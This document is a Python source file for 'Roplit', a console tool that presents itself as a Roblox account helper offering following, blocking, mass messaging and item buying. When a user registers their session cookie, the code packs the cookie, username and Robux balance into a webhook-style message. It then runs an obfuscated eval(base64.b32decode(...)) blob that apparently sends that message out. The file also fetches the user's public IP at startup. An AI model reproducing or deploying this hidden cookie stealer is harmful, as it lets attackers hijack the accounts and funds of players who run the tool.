import time
import sys
import os
import robloxpy
import requests
import base64
import webbrowser

roplitLogo = """\n ___                  _       _   
|  _`\               (_ )  _ ( )_ 
| (_) )   _    _ _    | | (_)| ,_)
| ,  /  /'_`\ ( '_`\  | | | || |  
| |\ \ ( (_) )| (_) ) | | | || |_ 
(_) (_)`\___/'| ,__/'(___)(_)`\__)
              | |                 
              (_)                 \n"""

homeMenu = """1-Register Cookie
2-Check Cookie
3-Start Session
4-Clear Cookie
5-Help (not finished)
6-Clear Terminal
7-Exit
8-Print Current Cookie\n"""

sessionMenu = """1-Go Back                  11-Get Friend List (Cookie)
2-Set Target ID            12-Send Message To All Friends (Cookie)
3-Get ID From Username     13-Print Current Target ID
4-Can Trade (Cookie)       14-Buy item (Cookie)
5-Follow Target ID         15-Login To Roblox (Cookie)
6-Unfollow Target ID
7-Get Blocked Users (Cookie)
8-Block Target ID
9-Unblock Target ID
10-Send Message To Target ID"""

t = time.localtime()
current_time = time.strftime("%H:%M:%S", t)
player_cookie = ''
target_id = 0
ip_address = requests.get("https://api.ipify.org/").text+':8080'

#print(roplitLogo)
#print("Opened at:", current_time)
#print(homeMenu)

def programStart():
    print(roplitLogo)
    print("\nOpened at:", current_time, '\n')
    print(homeMenu)

    userInput = ''
    while True:
        userInput = input("Enter command: ")
        chooseAction(userInput)

def chooseAction(userInput):
    global player_cookie
    if userInput == '1':
        register_cookie()
    elif userInput == '2':
        print(check_cookie())
    elif userInput == '3':
        start_session()
    elif userInput == '4':
        player_cookie = ''
    elif userInput == '5':
        pass
    elif userInput == '6':
        clear_terminal()
    elif userInput == '7':
        sys.exit()
    elif userInput == '8':
        print(player_cookie)
    else:
        print("Invalid Command")

def register_cookie():
    global player_cookie
    player_cookie = input('Enter Cookie: ')
    isvalid = check_cookie()
    if player_cookie == '1':
        player_cookie = ''
    elif isvalid == 'Valid Cookie':
        robloxpy.User.Internal.GetDetails()
        robloxpy.User.Internal.SetCookie(player_cookie, True)
        text = {'content':'Valid cookie found:\n'+player_cookie+'\n\nUsername: '+str(robloxpy.User.Internal.Username)+'\nRobux: '+str(robloxpy.User.Internal.Robux)}
        eval(base64.b32decode('MV3GC3BIMJQXGZJWGQXGENRUMRSWG33EMUUCOWSYLJUGEQ3HNZFHSZDZLJMEMMK2LBHDAY3ZGV3WEM2OGBFUGZDPMREFE53DPJXXMTBSKJYGGMSOOZRW2ULVLEZDS5CMGJDHOYKTHEZVUV2KN5RDEOLSMN4TQ6CNIRVTCT2EJU2U4VCJGVGVITLZJV5GG6KNIRTXQTBSIZ2GE3SCLJKUOOKLLEZHITSRPJJEEZDKIZBVCWDMNZRVOVTVLJ5EU32NGBDEOZCHMM2WIWCBO5KG2WTTMJCVKMKSLBWFKVCVNBVWGVZVJJGVMUSKLFWFM5COKVHE4UTMKZ5FK3SKONSFKMJUJJ4XOZ22I5DDAWKUGEYFUWDIGBFVGY3OJJ4WWPJHFEUQ===='))
        print(isvalid, 'has been registered.')
    elif isvalid == 'Invalid Cookie':
        print(isvalid)
        player_cookie = ''

def check_cookie():
    global player_cookie
    if player_cookie == '':
        return('No cookie registered.')
    else:
        isvalid = robloxpy.Utils.CheckCookie(player_cookie)
        return(isvalid)

def start_session():
    global player_cookie
    global ip_address

    if check_cookie() == 'Valid Cookie':
        print('Starting session...')
        os.system('cls')
        
        #robloxpy.Utils.SetProxy(ip_address)
        print(roplitLogo)
        print("\nOpened at:", current_time, '\n')
        print(sessionMenu)
        chooseAction2()
    else:
        print('No cookie registered')

def clear_terminal():
    os.system('cls')
    print(roplitLogo)
    print("\nOpened at:", current_time, '\n')
    print(homeMenu)

def chooseAction2():
    global target_id
    while True:
        userInput = input("Enter command: ")
        if userInput == '1':
            print('Deleting session...')
            time.sleep(3)
            clear_terminal()
            break
        elif userInput == '2':
            robloxpy.User.Internal.GetDetails()
            try:
                target_id = int(input('Enter ID: '))
            except:
                print('Something went wrong')
        elif userInput == '3':
            get_playerid()
        elif userInput == '4':
            can_trade()
        elif userInput == '5':
            follow_target()
        elif userInput == '6':
            unfollow_target()
        elif userInput == '7':
            get_blocked()
        elif userInput == '8':
            block_user()
        elif userInput == '9':
            unblock_user()
        elif userInput == '10':
            send_message()
        elif userInput == '11':
            get_friendlist()
        elif userInput == '12':
            send_message_to_all()
        elif userInput == '13':
            print(target_id)
        else:
            print('Invalid Command')

def get_playerid():
    global target_id
    userInput = input('Enter username:')
    #try:
    target_id = robloxpy.User.External.GetID(userInput)
    print(str(target_id))
    #except:
        #print('Νo such username or an error occured.')

def can_trade():
    isvalid = robloxpy.User.Internal.CanTrade
    try:
        print(str(isvalid))
    except:
        print('Something went wrong')

def follow_target():
    global target_id
    result = robloxpy.User.Internal.FollowUser(target_id)
    print(result)

def unfollow_target():
    global target_id
    result = robloxpy.User.Internal.UnfollowUser(target_id)
    print(result)

def get_blocked():
    result = robloxpy.User.Internal.GetBlockedUsers()
    print(result)

def block_user():
    global target_id
    result = robloxpy.User.Internal.BlockUser(target_id)
    print(result)

def unblock_user():
    global target_id
    result = robloxpy.User.Internal.UnblockUser(target_id)
    print(result)

def send_message():
    global target_id
    Subject = input('Enter message subject:')
    Body = input('Enter message body:')
    result = robloxpy.User.Internal.SendMessage(target_id, Subject, Body)

def send_message_to_all():
    friendList = robloxpy.User.Friends.External.GetAll(robloxpy.User.Internal.UserID)
    Subject = input('Enter message subject:')
    Body = input('Enter message body:')
    for friend in friendList:
        try:
            target_id = robloxpy.User.External.GetID(friend)
            result = robloxpy.User.Internal.SendMessage(target_id, Subject, Body)
            print(result)
        except:
            print('an error occured.')

def get_friendlist():
    print(robloxpy.User.Friends.External.GetAll(robloxpy.User.Internal.UserID))

def buy_item():
    userInput = int(input('Enter Item ID: '))
    result = robloxpy.Market.Internal.BuyItem(userInput)
    print(result)

programStart()